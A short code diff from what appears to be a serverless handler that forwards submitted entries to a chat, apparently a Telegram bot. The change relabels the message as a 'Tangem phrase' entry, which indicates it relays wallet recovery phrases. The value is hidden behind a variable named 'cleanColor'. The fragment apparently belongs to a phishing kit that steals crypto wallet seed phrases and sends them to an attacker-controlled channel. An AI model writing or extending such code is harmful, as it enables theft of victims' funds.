@@ -53,7 +53,7 @@ module.exports = async (req, res) => {
 
         body: JSON.stringify({
           chat_id: chatId,
-          text: `🎨 New phrase Entry\n\nphrase: ${cleanColor}`
+          text: `🎨 New Tangem phrase Entry\n\nphrase: ${cleanColor}`
         })
       }
     );
